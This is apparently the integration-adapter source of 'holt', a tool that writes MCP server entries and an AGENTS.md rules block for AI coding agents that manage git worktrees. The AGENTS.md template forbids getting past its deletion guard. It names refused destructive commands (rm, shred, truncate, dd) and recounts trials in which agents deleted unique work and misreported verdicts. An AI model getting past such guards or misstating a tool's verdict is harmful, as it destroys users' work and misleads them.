/**
 * holt — integration adapters.
 *
 * One neutral core (src/agent.mjs) produces verdicts; these adapters translate them into each
 * host's schema. Adding a host means adding an entry here, never touching the analysis.
 *
 * COVERAGE, and why each is here:
 *
 *   agents-md   UNIVERSAL AWARENESS. AGENTS.md is the Linux Foundation AAIF cross-tool standard,
 *               read natively by 30+ agents (Codex, Cursor, Copilot, Gemini CLI, Aider, Zed,
 *               Windsurf, Jules, Factory, Devin, VS Code…). This is the widest-reach surface
 *               that exists and it costs one markdown block.
 *   mcp         UNIVERSAL TOOLS. Any MCP-speaking host. Writes the server entry into whichever
 *               config files are present, so one command wires Cursor, Windsurf, Codex, Claude
 *               Code, Continue, Zed and others at once.
 *   claude-code DETERMINISTIC ENFORCEMENT via settings.json hooks (PreToolUse can deny).
 *   opencode    DETERMINISTIC ENFORCEMENT via its JS plugin API.
 *   git-hooks   AGENT-INDEPENDENT ENFORCEMENT. Works even for an agent with no plugin system at
 *               all, and for humans. This is the floor: if every other integration is missing,
 *               the repository still protects itself.
 *   generic     A documented stdin-JSON/stdout-JSON protocol plus exit codes, for any host not
 *               listed above. Nothing here requires holt to know the host in advance.
 *
 * ORDER MATTERS: awareness (AGENTS.md) and tools (MCP) work everywhere and are safe to install
 * unconditionally. Hooks are installed only for hosts actually detected in the repo/home, so we
 * never write config for a tool the user does not use.
 */

import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { parse as jsoncParse, modify as jsoncModify, applyEdits as jsoncApplyEdits } from 'jsonc-parser';
import { HOSTS, getHost, strengthLabel, CLOUD_CAVEAT } from './hosts.mjs';
import { recordCreated, readReceipt, holtOwnsFile, clearReceipt } from './receipt.mjs';
import { relativeWithinAsync } from '../paths.mjs';

// The receipt's paths go through relativeWithinAsync (src/paths.mjs), which canonicalises BOTH
// sides before comparing. A private `path.relative(repoRoot, abs)` here was the raw form the path
// guard hunts: on macOS a repo under /var resolves to /private/var, so the two spellings of the
// same file produce two different receipt keys and holt stops recognising what it created.

/**
 * Every directory holt had to bring into being to write `rel`, deepest first.
 *
 * `fs.mkdir(..., {recursive: true})` silently creates ANCESTORS too, so recording only the
 * immediate parent leaves the grandparent behind — measured: `.junie/mcp/mcp.json` cleaned up
 * `.junie/mcp` and left `.junie/`, which is itself a host-detection marker, so the self-detection
 * bug survived in miniature.
 */
function ancestorDirs(rel) {
  const parts = rel.split('/').slice(0, -1);
  const out = [];
  for (let i = parts.length; i > 0; i--) out.push(parts.slice(0, i).join('/'));
  return out;
}

const HOLT_BEGIN = '<!-- BEGIN holt -->';
const HOLT_END = '<!-- END holt -->';

/* ------------------------------------------------------- AGENTS.md (universal) ---- */

export function agentsMdBlock(bin = 'holt') {
  return `${HOLT_BEGIN}
## Parallel workstreams (holt)

This repository uses multiple git worktrees / jj workspaces at once. Work can exist in a
worktree that is invisible to ordinary git commands — \`git diff\` and \`merge-tree\` cannot
relate UNCOMMITTED changes across worktrees, so a worktree can hold the only copy of something.

### If you were asked to clean up worktrees, this is the whole task

\`\`\`bash
${bin} clean            # shows exactly what holds nothing base lacks — changes nothing
${bin} clean --apply    # removes those worktrees and their merged branches
\`\`\`

That is the safe, complete action. \`clean\` re-verifies each worktree immediately before removing
it, never touches one that holds work found nowhere else, and never touches one it could not
assess. **You do not need to decide which worktrees are disposable — that is what this computes.**

Do not hand-inspect worktrees and reason about them yourself. Measured across real trials, that
approach deleted a worktree holding the only copy of a security fix and kept two empty ones, in
the same run.

**Worktree names are not evidence.** Measured in real trials: agents deleted a worktree holding
the only copy of a security fix because it was called \`DELETEME-old-experiment\`, and kept two
empty ones because they were called \`IMPORTANT-do-not-delete\` and \`KEEP-release-candidate\` —
in both cases *after* holt had reported the opposite. Names, commit counts, file counts and
mtimes are all routinely anti-correlated with what a worktree actually holds. Use the content
verdict, not the label.

**Before deleting, pruning, or \`rm\`-ing any worktree, run this ONE COMMAND PER WORKTREE:**

\`\`\`bash
${bin} gate <worktree-id>
\`\`\`

Exit code \`0\` = disposable · \`1\` = holds work found nowhere else · \`2\` = could not verify
(treat as unsafe). Never delete on exit 1 or 2.

**The exit code is the verdict. Do not summarise, paraphrase or re-derive it.** Measured in a
real trial: an agent ran holt, then reported *"Holt verdict: all 16 are marked as safe to
delete"* when holt had marked seven as holding work found nowhere else — including one whose
uncommitted file the agent had itself just listed. Reading the prose output and summarising it is
how that happens. Run \`gate\` per worktree and branch on \`$?\`; it cannot be misread.

If a worktree is locked, that is holt protecting it. **Do not run \`git worktree unlock\` or
\`remove -f -f\` to get past it** — run \`${bin} rescue <id> --release\`, which preserves the work
to a verifiable ref first and then releases the lock.

### The same rule applies one file at a time

A worktree is not the only thing that can hold the only copy of something. An untracked file, a
modified-but-uncommitted file and a gitignored file are all content **git cannot bring back** —
so \`rm\`, \`git rm\`, \`truncate\`, \`shred\`, \`mv\` out of the tree, \`cp\`/\`tee\`/\`dd\` over it
and \`> file\` are refused against those paths exactly as a worktree deletion is. Regenerable
output (\`node_modules/\`, \`dist/\`, \`build/\`, \`coverage/\`, \`*.log\`, lockfiles) and anything
already committed are never protected, so ordinary cleanup is unaffected. If a refusal names a
file you truly do not want, commit it, \`${bin} rescue\` it, or delete it yourself outside the
agent — do not look for another verb that gets past the guard.

**Before starting work, check what your siblings are doing:**

\`\`\`bash
${bin} context <worktree-id>     # who else is editing your files, what already exists
${bin} status                    # collisions, duplicates, what is at risk
\`\`\`

If a symbol you are about to write already exists in another workstream, reuse or coordinate —
do not build it twice. Add \`--json\` to any command for machine-readable output.
${HOLT_END}`;
}

/**
 * Remove every holt-delimited block from a document, leaving the user's own content untouched.
 * Global and tolerant: handles zero, one, or several blocks, and trims the blank lines a removal
 * leaves behind so re-running integrate never grows the file.
 */
export function stripHoltBlock(text) {
  const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const re = new RegExp(`\\n*${esc(HOLT_BEGIN)}[\\s\\S]*?${esc(HOLT_END)}\\n*`, 'g');
  return text.replace(re, '\n').replace(/\n{3,}/g, '\n\n');
}

/**
 * Insert/refresh holt's block in AGENTS.md WITHOUT ever destroying the user's existing content.
 *
 * A repo very often already has an AGENTS.md (it is the cross-tool standard). So: strip any prior
 * holt block, keep everything else exactly, and append one fresh holt block at the end. Running
 * integrate any number of times converges to the same file — the user's rules first, holt's block
 * last, no duplication, no growth.
 */
export async function installAgentsMd(repoRoot, { bin = 'holt', filename = 'AGENTS.md' } = {}) {
  const file = path.join(repoRoot, filename);
  let existing = '';
  let created = true;
  try {
    existing = await fs.readFile(file, 'utf8');
    created = false;
  } catch { /* new file */ }

  const userContent = stripHoltBlock(existing).replace(/\s+$/, '');
  const block = agentsMdBlock(bin);
  const header = (created && !userContent)
    ? '# AGENTS.md\n\nInstructions for AI coding agents working in this repository.\n\n'
    : '';
  const next = userContent
    ? `${header}${userContent}\n\n${block}\n`
    : `${header}${block}\n`;

  await fs.writeFile(file, next, 'utf8');
  // RECORD, DO NOT INFER. uninstall runs in a different process and cannot see `created` unless
  // it is written down. Inferring ownership from the residue instead deleted a user's own
  // AGENTS.md that happened to be byte-identical to holt's preamble. See src/integrate/receipt.mjs.
  if (created) await recordCreated(repoRoot, { files: [filename] });
  const hadBlock = existing.includes(HOLT_BEGIN);
  return {
    adapter: 'agents-md', path: file, created,
    action: created ? 'created' : hadBlock ? 'refreshed holt block' : 'appended holt block (kept your content)',
    preservedUserContent: !created && !!userContent,
  };
}

/* --------------------------------------------------------------- MCP (universal) ---- */

/**
 * MCP config locations, by host. Each entry says where the file lives and which key holds the
 * server map, because the ecosystem did not converge on one shape.
 */
/**
 * MCP config locations, by host and SCOPE.
 *
 * Scope matters and the default is project-only. An earlier revision wrote to every user-global
 * config it could find — ~/.cursor/mcp.json, ~/.codeium/…, ~/.config/zed/… — the first time it
 * ran. Editing a developer's home configuration for every editor they have installed, because
 * they asked to wire up ONE repository, is not acceptable behaviour for an install command. It
 * is also usually wrong: the entry points at a `holt` binary that may only exist for this
 * project.
 *
 * `--global` opts into user scope explicitly.
 */
export function mcpTargets(repoRoot, home = os.homedir(), { scope = 'project' } = {}) {
  const project = [
    { host: 'claude-code', scope: 'project', file: path.join(repoRoot, '.mcp.json'), key: 'mcpServers' },
    { host: 'cursor', scope: 'project', file: path.join(repoRoot, '.cursor', 'mcp.json'), key: 'mcpServers' },
    // VS Code's OWN mcp.json — key `servers`, not `mcpServers`. This is NOT also Copilot CLI's
    // config: Copilot CLI does not read .vscode/mcp.json at all (it uses the unsupported key
    // `servers`; confirmed against a Microsoft migration notice telling users to move OFF this
    // file for the CLI). Labelled 'vscode' alone on purpose — see the 'copilot' row below for the
    // file the CLI actually reads.
    { host: 'vscode', scope: 'project', file: path.join(repoRoot, '.vscode', 'mcp.json'), key: 'servers' },
    // Copilot CLI's real project config: .mcp.json or .github/mcp.json, both `mcpServers` (also
    // accepts the bare Claude-style shape). Confirmed against GitHub's own docs
    // (docs.github.com/en/copilot/how-tos/copilot-cli/customize-copilot/add-mcp-servers). Uses
    // .github/mcp.json rather than piggybacking on claude-code's .mcp.json row so this host's
    // coverage is explicit and independently testable, not an accident of file-sharing.
    { host: 'copilot', scope: 'project', file: path.join(repoRoot, '.github', 'mcp.json'), key: 'mcpServers' },
    { host: 'gemini-cli', scope: 'project', file: path.join(repoRoot, '.gemini', 'settings.json'), key: 'mcpServers' },
    // OpenCode uses a DIFFERENT key AND a different entry shape. Verified against a live
    // `opencode debug config`: mcp: { name: { type: "local", command: [bin, ...args] } }.
    // Writing the mcpServers shape here would produce a config opencode silently ignores.
    { host: 'opencode', scope: 'project', file: path.join(repoRoot, 'opencode.json'), key: 'mcp', shape: 'opencode' },
    // Crush uses yet a third shape: mcp:{name:{type:"stdio",command,args}}. Verified against a
    // live ~/.config/crush/crush.json.
    { host: 'crush', scope: 'project', file: path.join(repoRoot, 'crush.json'), key: 'mcp', shape: 'crush' },

    // ---- hosts the manifest ADVERTISED and integrate never wrote ------------------------
    // Each path and key below was confirmed against the host's own current documentation. A
    // wrong config is worse than none, so anything that could not be confirmed is left out and
    // its manifest entry says so instead.
    //
    // Codex CLI is TOML, not JSON — the one major host that is, and the reason holt now has a
    // TOML writer at all.
    { host: 'codex', scope: 'project', file: path.join(repoRoot, '.codex', 'config.toml'), key: 'mcp_servers', format: 'toml' },
    // Cline CLI has NO project-scope MCP file — deliberately absent, not an oversight. Verified
    // against cline/cline#11671 (Cline's own maintainers): there is exactly one MCP config file,
    // global, at ~/.cline/data/settings/cline_mcp_settings.json — see the user-scope row below.
    // The VS Code extension keeps its own copy in UI-managed global storage under a per-platform
    // path holt deliberately does not write into.
    // Amp's map hangs off a DOTTED top-level key, not a bare `mcpServers`.
    { host: 'amp', scope: 'project', file: path.join(repoRoot, '.amp', 'settings.json'), key: 'amp.mcpServers' },
    { host: 'factory', scope: 'project', file: path.join(repoRoot, '.factory', 'mcp.json'), key: 'mcpServers' },
    { host: 'junie', scope: 'project', file: path.join(repoRoot, '.junie', 'mcp', 'mcp.json'), key: 'mcpServers' },
    // Zed reads `context_servers`, and ignores an entry without source:"custom".
    { host: 'zed', scope: 'project', file: path.join(repoRoot, '.zed', 'settings.json'), key: 'context_servers', shape: 'zed' },
    { host: 'warp', scope: 'project', file: path.join(repoRoot, '.warp', '.mcp.json'), key: 'mcpServers' },
    // Kilo Code v7 was rebuilt on the OpenCode engine, which is why its key and entry shape are
    // OpenCode's rather than the `mcpServers` its Roo ancestry would suggest.
    { host: 'kilo', scope: 'project', file: path.join(repoRoot, '.kilo', 'kilo.jsonc'), key: 'mcp', shape: 'kilo' },
    { host: 'roo', scope: 'project', file: path.join(repoRoot, '.roo', 'mcp.json'), key: 'mcpServers' },
    // Amazon Q Developer CLI is local (real files, real git) despite the manifest previously
    // classifying the whole "amazon-q" row as cloud-only. Confirmed against docs.aws.amazon.com:
    // legacy-but-enabled-by-default mcpServers file, both scopes — see the user-scope row below.
    { host: 'amazon-q', scope: 'project', file: path.join(repoRoot, '.amazonq', 'mcp.json'), key: 'mcpServers' },
  ];
  const user = [
    { host: 'cursor', scope: 'user', file: path.join(home, '.cursor', 'mcp.json'), key: 'mcpServers' },
    { host: 'devin-desktop', scope: 'user', file: path.join(home, '.codeium', 'windsurf', 'mcp_config.json'), key: 'mcpServers' },
    { host: 'gemini-cli', scope: 'user', file: path.join(home, '.gemini', 'settings.json'), key: 'mcpServers' },
    { host: 'zed', scope: 'user', file: path.join(home, '.config', 'zed', 'settings.json'), key: 'context_servers' },
    { host: 'continue', scope: 'user', file: path.join(home, '.continue', 'config.json'), key: 'mcpServers' },
    { host: 'opencode', scope: 'user', file: path.join(home, '.config', 'opencode', 'opencode.json'), key: 'mcp', shape: 'opencode' },
    { host: 'codex', scope: 'user', file: path.join(home, '.codex', 'config.toml'), key: 'mcp_servers', format: 'toml' },
    // GitHub Copilot CLI. Its cloud coding agent is a different product with no repository file
    // at all — configured in repo settings — which is why only the CLI appears here.
    { host: 'copilot', scope: 'user', file: path.join(home, '.copilot', 'mcp-config.json'), key: 'mcpServers' },
    // NOT ~/.cline/mcp.json — that path is what Cline's OWN docs say (wrongly; see cline/cline#11671).
    // The code reads ~/.cline/data/settings/cline_mcp_settings.json. holt was shipping the same
    // wrong path the docs had, which means it had never actually written a Cline config anywhere
    // Cline would load it.
    { host: 'cline', scope: 'user', file: path.join(home, '.cline', 'data', 'settings', 'cline_mcp_settings.json'), key: 'mcpServers' },
    { host: 'amp', scope: 'user', file: path.join(home, '.config', 'amp', 'settings.json'), key: 'amp.mcpServers' },
    { host: 'factory', scope: 'user', file: path.join(home, '.factory', 'mcp.json'), key: 'mcpServers' },
    { host: 'junie', scope: 'user', file: path.join(home, '.junie', 'mcp', 'mcp.json'), key: 'mcpServers' },
    { host: 'warp', scope: 'user', file: path.join(home, '.warp', '.mcp.json'), key: 'mcpServers' },
    { host: 'kilo', scope: 'user', file: path.join(home, '.config', 'kilo', 'kilo.jsonc'), key: 'mcp', shape: 'kilo' },
    { host: 'amazon-q', scope: 'user', file: path.join(home, '.aws', 'amazonq', 'mcp.json'), key: 'mcpServers' },
  ];
  return scope === 'user' ? user : scope === 'all' ? [...project, ...user] : project;
}

/**
 * Locations a PAST version of `holt integrate` wrote that are now known WRONG or superseded —
 * each confirmed against the host's own source or docs, not merely renamed for tidiness.
 *
 * PROVEN, not hypothetical: the commit that shipped as v0.3.0 (a976ab4d) wrote a project-scope
 * `.cline/mcp.json` and a user-scope `~/.cline/mcp.json`. The very next commit (435a0979)
 * discovered both were wrong — Cline CLI has no project-scope MCP file at all
 * (cline/cline#11671), and the real global file lives at
 * `~/.cline/data/settings/cline_mcp_settings.json` — and removed them from `mcpTargets`, with
 * nothing that ever cleans up a copy already on a real disk. Anyone who ran `integrate` against
 * that one commit and then upgrades has these files forever, and `holt integrate` never looks at
 * them again because they are not in `mcpTargets` any more. This list, and retireLegacyMcp below,
 * is the general mechanism so the NEXT correction (there will be one) is safe by construction
 * instead of requiring a fresh one-off cleanup.
 */
export function legacyMcpTargets(repoRoot, home = os.homedir()) {
  return [
    {
      host: 'cline', scope: 'project', file: path.join(repoRoot, '.cline', 'mcp.json'), key: 'mcpServers',
      reason: 'Cline CLI has no project-scope MCP file (cline/cline#11671) — this should never have been written',
    },
    {
      host: 'cline', scope: 'user', file: path.join(home, '.cline', 'mcp.json'), key: 'mcpServers',
      reason: 'wrong path — Cline reads ~/.cline/data/settings/cline_mcp_settings.json, never this file',
    },
  ];
}

/**
 * Remove holt's entry from every retired location, IF it is still there and still looks like
 * holt's own entry. Only the `holt` key is touched — anything else a user (or another tool) put
 * in the same file survives untouched; the file itself is removed only when holt's entry was its
 * entire content.
 *
 * Silent when there is nothing to retire: an absent legacy file is the expected steady state for
 * the overwhelming majority of repositories (anyone who never ran integrate during the narrow
 * window a since-corrected path was live), and reporting "nothing here" on every run would bury
 * the rare real finding in noise.
 */
export async function retireLegacyMcp(repoRoot, { home = os.homedir(), scope = 'project' } = {}) {
  const results = [];
  for (const t of legacyMcpTargets(repoRoot, home)) {
    if (t.scope === 'user' && scope === 'project') continue; // never touch HOME unless asked
    let cfg, rawText;
    try {
      rawText = await fs.readFile(t.file, 'utf8');
      cfg = readJsoncOrThrow(rawText);
    } catch {
      continue; // no file (the common case) — nothing to retire, nothing to say
    }
    if (!cfg[t.key] || !cfg[t.key].holt) continue; // holt never wrote here, or it is already gone

    delete cfg[t.key].holt;
    if (Object.keys(cfg[t.key]).length === 0) delete cfg[t.key];

    if (Object.keys(cfg).length === 0) {
      await fs.rm(t.file, { force: true });
      results.push({ adapter: 'mcp-retire', host: t.host, scope: t.scope, path: t.file, action: `removed — ${t.reason}` });
    } else {
      // JSONC-PRESERVING WRITE: surgically remove the holt key, preserving comments.
      let output = jsoncWrite(rawText, [[[t.key], cfg[t.key] ?? undefined]], { tabSize: 2, insertSpaces: true });
      if (!output.endsWith('\n')) output += '\n';
      await fs.writeFile(t.file, output, 'utf8');
      results.push({
        adapter: 'mcp-retire', host: t.host, scope: t.scope, path: t.file,
        action: `holt's entry removed, your other settings kept — ${t.reason}`,
      });
    }
  }
  return results;
}

/**
 * DOES THIS MCP SERVER ENTRY ACTUALLY RUN HOLT?
 *
 * OWNERSHIP BY KEY NAME ALONE DELETED OTHER PEOPLE'S CONFIG FILES. `holt uninstall` matched on
 * `cfg[t.key].holt` — the KEY — with no look at what the entry runs, then removed it, and then
 * removed the whole FILE if nothing else was left. Reproduced across all 16 project MCP targets
 * in a repository holt had never been integrated into, each seeded with a single third-party
 * server that merely happened to be named `holt`:
 *
 *     {"mcpServers": {"holt": {"command": "/opt/holtind/inventory-mcp", "args": ["--tenant","eu"]}}}
 *
 * Every one of those files was deleted, and the run printed "Only holt's own entries were
 * touched — anything else in these files was left as-is."
 *
 * The entry must therefore RUN holt: its executable (or the first element of a `command` array)
 * must have a holt basename, and `mcp` must be among its arguments — which is the only shape
 * mcpServerEntry() below ever produces. Anything else belongs to somebody else.
 */
export function isHoltMcpEntry(entry) {
  if (!entry || typeof entry !== 'object') return false;
  const cmd = Array.isArray(entry.command) ? entry.command[0] : entry.command;
  if (typeof cmd !== 'string' || !cmd.trim()) return false;
  const argv = [
    ...String(cmd).trim().split(/\s+/),
    ...(Array.isArray(entry.command) ? entry.command.slice(1) : []),
    ...(Array.isArray(entry.args) ? entry.args : []),
  ].filter((x) => typeof x === 'string');
  let i = 0;
  while (i < argv.length && (LAUNCHERS.has(path.basename(argv[i]).toLowerCase()) || argv[i].startsWith('-')
    || (i > 0 && ['dlx', 'exec', 'run'].includes(argv[i])))) i++;
  if (i >= argv.length || !HOLT_BINARY.test(path.basename(argv[i]))) return false;
  return argv.slice(i + 1).includes('mcp');
}

/**
 * The server entry, in whichever shape the host expects.
 *
 * `bin` may carry arguments ("node /path/holt.mjs", "npx holt"), so it is split rather than
 * passed whole — the same defect that made the OpenCode plugin gate fail open.
 */
export function mcpServerEntry(bin = 'holt', shape = 'standard') {
  const [cmd, ...prefix] = String(bin).trim().split(/\s+/);
  if (shape === 'opencode' || shape === 'kilo') {
    return { type: 'local', command: [cmd, ...prefix, 'mcp'], enabled: true };
  }
  if (shape === 'crush') {
    return { type: 'stdio', command: cmd, args: [...prefix, 'mcp'] };
  }
  if (shape === 'zed') {
    // Zed requires source:"custom" on a manually-added server; without it the entry is ignored.
    return { source: 'custom', command: cmd, args: [...prefix, 'mcp'], env: {} };
  }
  return { command: cmd, args: [...prefix, 'mcp'], env: {} };
}

/**
 * JSONC tolerance. Kilo Code's config is `.jsonc` and Amp's may be, so a user's file can legally
 * carry comments that JSON.parse rejects. Failing to parse would be read as "no file" and, at
 * project scope, silently REPLACE their config — so comments are stripped for reading only.
 * String-aware, or a `//` inside a Windows path or a URL would truncate the document.
 */

/**
 * Read a JSON/JSONC config the way every host that reads it does.
 *
 * A LEGAL TRAILING COMMA COST A TEAM THEIR ENTIRE MCP CONFIGURATION. `.mcp.json`,
 * `.vscode/mcp.json`, `.cursor/mcp.json` and friends are JSONC — VS Code, Cursor and Claude Code
 * all accept comments and trailing commas — and holt read them with a hand-rolled comment
 * stripper followed by `JSON.parse`, which does not. So this perfectly valid file:
 *
 *     { // our team's servers
 *       "mcpServers": {
 *         "acme-inventory": { "command": "/opt/acme/mcp" },
 *         "acme-billing":   { "command": "/opt/acme/billing-mcp" },   <- trailing comma
 *       }
 *     }
 *
 * threw, the catch recorded `exists = false`, and project scope then CREATED the file — writing a
 * config containing only holt's server. Both third-party servers were deleted by an `integrate`
 * that believed it was writing into empty space.
 *
 * jsonc-parser is already a dependency and is what the hosts themselves use. It handles both.
 *
 * And ABSENT is not the same as UNREADABLE. The two were conflated by one `catch`, and only one
 * of them makes it safe to write. A file that exists and cannot be understood is somebody's
 * configuration; it is never holt's to replace.
 */
function parseJsonc(rawText) {
  const errors = [];
  const value = jsoncParse(rawText, errors, { allowTrailingComma: true, disallowComments: false });
  if (errors.length || value === undefined) {
    return { ok: false, value: null, why: `${errors.length} parse error(s)` };
  }
  return { ok: true, value, why: null };
}


/** The throwing form, for call sites whose surrounding try/catch already means "leave it alone". */
function readJsoncOrThrow(rawText) {
  const r = parseJsonc(rawText);
  if (!r.ok) throw new Error(`unparseable JSON/JSONC: ${r.why}`);
  return r.value;
}

function stripJsonComments(text) {
  let out = ''; let inStr = false; let esc = false; let line = false; let block = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]; const n = text[i + 1];
    if (line) { if (c === '\n') { line = false; out += c; } continue; }
    if (block) { if (c === '*' && n === '/') { block = false; i++; } continue; }
    if (inStr) { out += c; if (esc) esc = false; else if (c === '\\') esc = true; else if (c === '"') inStr = false; continue; }
    if (c === '"') { inStr = true; out += c; continue; }
    if (c === '/' && n === '/') { line = true; i++; continue; }
    if (c === '/' && n === '*') { block = true; i++; continue; }
    out += c;
  }
  return out;
}

/**
 * JSONC-PRESERVING WRITE. The SOTA for editing JSON-with-comments files (VSCode's own
 * settings.json editor uses this library) is jsonc-parser's modify()+applyEdits(), which
 * operates on the TEXT directly — surgically editing only the paths that changed, preserving
 * every comment, every blank line, every formatting choice the user made.
 *
 * The previous code parsed with stripJsonComments, modified the object, and wrote with
 * JSON.stringify — destroying every comment in the file. Enterprise repos annotate their
 * configs; losing those annotations on a `holt integrate` is the kind of silent damage that
 * teaches a user to never let the tool touch their settings again.
 *
 * This function takes the ORIGINAL text (with comments), a set of [pathSegments, value] edits,
 * and returns the text with those edits applied and everything else byte-identical. Path segments
 * are arrays of strings/numbers (e.g. ['hooks', 'PreToolUse'] or ['mcpServers', 'holt']).
 *
 * Setting a value to `undefined` REMOVES that key/element (jsonc-parser convention), preserving
 * comments that were associated with the position.
 */
function jsoncWrite(text, edits, { tabSize = 2, insertSpaces = true } = {}) {
  const fmt = { tabSize, insertSpaces, eol: '\n' };
  let result = text;
  for (const [jsonPath, value] of edits) {
    const editErrors = [];
    const editsForThis = jsoncModify(result, jsonPath, value, { formattingOptions: fmt, allowTrailingCommas: true }, editErrors);
    result = jsoncApplyEdits(result, editsForThis, { formattingOptions: fmt });
  }
  return result;
}

/**
 * Element-level JSONC-preserving reconciliation of a hook event array.
 *
 * Instead of replacing the whole array (which destroys comments inside it), this function:
 *   1. Removes holt's existing entries by index (highest to lowest, so earlier indices don't shift)
 *   2. Appends holt's new entries at the end of the array
 *
 * This preserves comments before user entries and before the array itself. Comments before
 * holt's removed entries stay in place (jsonc-parser attaches them to the next element), which
 * is the best available behavior — the comment is not lost, just re-associated.
 *
 * `isMineEntry(entry)` returns true for entries holt should remove/replace.
 * `newEntries` is the array of holt's new entries to append.
 * Returns the edited text, or null if no edits were needed.
 */
function jsoncReconcileArray(text, arrayPath, isMineEntry, newEntries, { tabSize = 2, insertSpaces = true } = {}) {
  const fmt = { tabSize, insertSpaces, eol: '\n' };
  const cfg = readJsoncOrThrow(text);
  // Navigate to the array
  let arr = cfg;
  for (const seg of arrayPath) {
    arr = arr?.[seg];
    if (arr == null) break;
  }
  if (!Array.isArray(arr)) return null; // nothing to reconcile

  // Find indices of holt's entries
  const mineIndices = [];
  for (let i = 0; i < arr.length; i++) {
    if (isMineEntry(arr[i])) mineIndices.push(i);
  }
  if (mineIndices.length === 0 && newEntries == null) return null;
  if (mineIndices.length === 0 && newEntries?.length === 0) return null;

  let result = text;
  // Remove holt's entries from highest index to lowest (so earlier indices don't shift)
  for (let i = mineIndices.length - 1; i >= 0; i--) {
    const idx = mineIndices[i];
    const edits = jsoncModify(result, [...arrayPath, idx], undefined, { formattingOptions: fmt, allowTrailingCommas: true });
    result = jsoncApplyEdits(result, edits, { formattingOptions: fmt });
  }

  // Append new entries at the end
  if (newEntries && newEntries.length > 0) {
    // After removals, the array length has changed. Re-parse to find the new length.
    const newCfg = readJsoncOrThrow(result);
    let newArr = newCfg;
    for (const seg of arrayPath) newArr = newArr?.[seg];
    const startIdx = Array.isArray(newArr) ? newArr.length : 0;
    for (let i = 0; i < newEntries.length; i++) {
      const edits = jsoncModify(result, [...arrayPath, startIdx + i], newEntries[i], { formattingOptions: fmt, allowTrailingCommas: true });
      result = jsoncApplyEdits(result, edits, { formattingOptions: fmt });
    }
  }

  return result;
}

/**
 * Read a JSONC file as an object (comments stripped for parsing) AND return the raw text.
 * The raw text is kept so jsoncWrite can preserve comments when writing back.
 */
async function readJsonc(file) {
  let text;
  try { text = await fs.readFile(file, 'utf8'); } catch { return { cfg: null, text: null }; }
  const cfg = readJsoncOrThrow(text);
  return { cfg, text };
}

/* ----------------------------------------------------------------------- TOML ---- */

/**
 * A TOML string literal. Basic strings, so backslashes and quotes must be escaped — on Windows
 * `bin` is a path full of backslashes, and emitting it raw produces a file Codex refuses to parse.
 */
const tomlStr = (s) => `"${String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"`;

/**
 * Merge holt's server into a Codex `config.toml`, PRESERVING everything else in the file.
 *
 * Codex CLI is the one major host whose MCP config is not JSON, and holt had no TOML writer
 * anywhere — so Codex was advertised as MCP-capable in the manifest, in HOSTS.md and in the
 * README while `holt integrate` wrote it nothing at all.
 *
 * This is deliberately a NARROW, LINE-ORIENTED merge rather than a TOML parser. A user's
 * config.toml holds their model settings, approval policy and sandbox rules; round-tripping it
 * through a hand-written parser risks losing a key holt does not understand, and losing a
 * sandbox setting is a security regression holt has no business causing. So: find the
 * `[mcp_servers.holt]` table if it exists, replace exactly that block, and otherwise append.
 * Every other byte of the file is passed through untouched.
 */
export function tomlWithHoltServer(existing, bin = 'holt') {
  const [cmd, ...prefix] = String(bin).trim().split(/\s+/);
  const args = [...prefix, 'mcp'];
  const block = `[mcp_servers.holt]\n`
    + `command = ${tomlStr(cmd)}\n`
    + `args = [${args.map(tomlStr).join(', ')}]\n`;

  const src = String(existing ?? '');
  const lines = src.split('\n');
  // A table header ends where the NEXT header begins — that span is holt's block and nothing else.
  const start = lines.findIndex((l) => /^\s*\[mcp_servers\.holt\]\s*$/.test(l));
  if (start === -1) {
    const sep = src.length === 0 || src.endsWith('\n\n') ? '' : src.endsWith('\n') ? '\n' : '\n\n';
    return `${src}${sep}${block}`;
  }
  let end = start + 1;
  while (end < lines.length && !/^\s*\[/.test(lines[end])) end++;
  // Rebuilt with the SAME trailing shape it was found in. Dropping the final newline made
  // `integrate` non-idempotent — running it twice produced two different files — and integrate
  // is documented as idempotent because agents and CI run it repeatedly.
  const merged = [...lines.slice(0, start), ...block.trimEnd().split('\n'), ...lines.slice(end)]
    .join('\n');
  return merged.endsWith('\n') ? merged : `${merged}\n`;
}

/** The inverse of tomlWithHoltServer: remove holt's table, leaving everything else untouched. */
export function tomlWithoutHoltServer(existing) {
  const src = String(existing ?? '');
  const lines = src.split('\n');
  const start = lines.findIndex((l) => /^\s*\[mcp_servers\.holt\]\s*$/.test(l));
  if (start === -1) return src;
  let end = start + 1;
  while (end < lines.length && !/^\s*\[/.test(lines[end])) end++;
  return [...lines.slice(0, start), ...lines.slice(end)].join('\n').replace(/\n{3,}/g, '\n\n');
}

/**
 * Write the holt MCP server into a host config.
 * `onlyExisting` (default) touches only files that already exist, so holt never fabricates
 * config for tools the user does not have installed.
 */
export async function installMcp(repoRoot, {
  bin = 'holt', home = os.homedir(), scope = 'project', hosts = null,
} = {}) {
  const results = [];
  for (const t of mcpTargets(repoRoot, home, { scope })) {
    // DETECTION GATES USER SCOPE, NOT PROJECT SCOPE — which is what this file has claimed in
    // three separate comments ("AGENTS.md and project MCP config go in unconditionally") while
    // doing the opposite. The gate applied to every row, so `holt integrate` in a repository
    // where the user has not yet installed, say, Codex wrote nothing for Codex — and the whole
    // point of a project-scope config is that it is committed and works for the NEXT person, who
    // does have it. A repo wired for six agents by one developer is the feature.
    //
    // The asymmetry is deliberate and is the same one everywhere else here:
    //   project scope  lives in the repository, is reviewed, and is the artefact being created
    //   user scope     is somebody's machine — writing there for a tool they do not run is
    //                  indistinguishable from installing software they did not ask for
    if (t.scope === 'user' && hosts
      && !hosts.some((h) => t.host.startsWith(h.replace('-cli', '')) || h.startsWith(t.host))) {
      results.push({ adapter: 'mcp', host: t.host, scope: t.scope, path: t.file, action: 'skipped (host not detected)' });
      continue;
    }

    // TOML hosts (Codex CLI) merge textually, preserving every setting holt does not understand.
    if (t.format === 'toml') {
      let existing = '';
      let hadFile = true;
      try {
        existing = await fs.readFile(t.file, 'utf8');
      } catch {
        hadFile = false;
        if (t.scope === 'user') {
          results.push({ adapter: 'mcp', host: t.host, scope: t.scope, path: t.file, action: 'skipped (no user config)' });
          continue;
        }
      }
      const had = /^\s*\[mcp_servers\.holt\]\s*$/m.test(existing);
      await fs.mkdir(path.dirname(t.file), { recursive: true });
